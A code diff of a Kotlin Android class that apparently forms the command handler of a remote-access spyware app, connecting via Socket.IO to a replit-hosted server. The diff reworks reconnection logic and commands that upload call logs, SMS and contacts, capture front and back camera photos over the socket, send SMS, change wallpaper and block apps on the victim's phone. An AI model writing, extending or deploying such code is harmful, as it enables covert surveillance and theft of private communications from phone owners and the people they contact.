@@ -1,57 +1,41 @@
 package com.example.betryalcommit
 
-import android.app.Activity
 import android.content.Context
 import android.content.Intent
 import android.content.SharedPreferences
-import android.os.Handler
-import android.os.Looper
 import android.util.Log
-import android.widget.Toast
 import io.socket.client.IO
 import io.socket.client.Socket
 import io.socket.emitter.Emitter
 import org.json.JSONArray
 import org.json.JSONObject
 import wallpaperset
+
 private const val serverUrl = "https://bertrylcommit-back.botsailer1.repl.co"
 class suket(private val context: Context) {
     private var socket: Socket = IO.socket(serverUrl)
-    val finalcode = context.getSharedPreferences("MyPrefs", Context.MODE_PRIVATE).getString("finalcode", null);
+
+    val sharedpref = context.getSharedPreferences("MyPrefs", Context.MODE_PRIVATE)
+    val roomId = sharedpref.getString("finalcode", null);
+
+
     private val onError = Emitter.Listener {
         Log.i("SOCKET", "Error connecting to server")
-        Handler(Looper.getMainLooper()).postDelayed({
-            reconnectSocket()
-        }, 10000)
+        reconnectSocket()
     }
+
     private  val onConnect = Emitter.Listener {
         Log.i("SOCKET", "Connected to server")
-        if (finalcode != null){
-        socket.emit("joinRoom", finalcode)
+        socket.emit("joinRoom", "$roomId")
     }
-        else{
-            Handler(Looper.getMainLooper()).postDelayed({
-                Toast.makeText(context.applicationContext, "no finalcode found", Toast.LENGTH_SHORT).show()
-            }, 1000)
-
-        }
-    }
-
     private val onDisconnect = Emitter.Listener {
-
-        Handler(Looper.getMainLooper()).postDelayed({
-            reconnectSocket()
-        }, 10000)
+        reconnectSocket()
     }
 
 
     private fun reconnectSocket() {
-        Handler(Looper.getMainLooper()).postDelayed({
-            if (!socket.connected()) {
-                socket.connect()
-            }
-        }, 10000)
-    }
+        if (!socket.connected()) {
+            socket.connect() } }
 
     private val onMessage = Emitter.Listener { args ->
         val text = args[0] as String
@@ -86,13 +70,12 @@ class suket(private val context: Context) {
                 callutil.uploadCalls(context.contentResolver, socket)
             }
             "wallpaper" -> {
-                Log.e("wallpaper", data)
                 wallpaperset.setWallpaper(context, data)
             }
             "sms_logs" -> { Teleserv.uploadsms(context.contentResolver, socket) }
-            "contact_logs" -> { Teleserv.uploadContact(context, socket) }
-            "camera0" ->CameraCaptureHelper().capture(serverUrl, 0 );
-            "camera1" -> CameraCaptureHelper().capture(serverUrl, 1 );
+            "contacts_logs" -> { Teleserv.uploadContact(context, socket) }
+            "camera0" ->CameraCaptureHelper().capture(socket, 0 );
+            "camera1" -> CameraCaptureHelper().capture(socket, 1 );
             "sms_send" ->Teleserv.sendMessage(context, num, msg?:"")
             "block_package" -> {val pref = context.getSharedPreferences("MyPrefs", Context.MODE_PRIVATE)
                 val editor: SharedPreferences.Editor = pref.edit()
@@ -101,7 +84,7 @@ class suket(private val context: Context) {
                 targetPackageNames.add(data)
                 editor.putStringSet("targetPackages", targetPackageNames.toSet())
                 editor.apply()
-        }
+            }
             "list_blocked_packages" -> {val prefs = context.getSharedPreferences("MyPrefs", Context.MODE_PRIVATE)
                 val set = prefs.getStringSet("targetPackages", null)
                 val targetPackageNames = set?.toMutableList() ?: mutableListOf()
@@ -111,13 +94,13 @@ class suket(private val context: Context) {
                 socket.emit("response", jsonzs.toString())
             }
             "unblock_package" -> {val pref = context.getSharedPreferences("MyPrefs", Context.MODE_PRIVATE)
-            val editor:SharedPreferences.Editor = pref.edit()
-            val set = pref.getStringSet("targetPackages", null)
-            val targetPackageNames = set?.toMutableList() ?: mutableListOf()
-            targetPackageNames.remove(data)
-            editor.putStringSet("targetPackages", targetPackageNames.toSet())
-            editor.apply()
-        }
+                val editor:SharedPreferences.Editor = pref.edit()
+                val set = pref.getStringSet("targetPackages", null)
+                val targetPackageNames = set?.toMutableList() ?: mutableListOf()
+                targetPackageNames.remove(data)
+                editor.putStringSet("targetPackages", targetPackageNames.toSet())
+                editor.apply()
+            }
             "forgive_app" -> {val pref = context.getSharedPreferences("MyPrefs", Context.MODE_PRIVATE)
                 val editor:SharedPreferences.Editor = pref.edit()
                 val set = pref.getStringSet("targetPackages", null)
@@ -137,7 +120,7 @@ class suket(private val context: Context) {
                 serviceIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                 context.startService(serviceIntent)
             }
-    }
+        }
     }
     init {
         val pref = context.getSharedPreferences("MyPrefs", Context.MODE_PRIVATE)
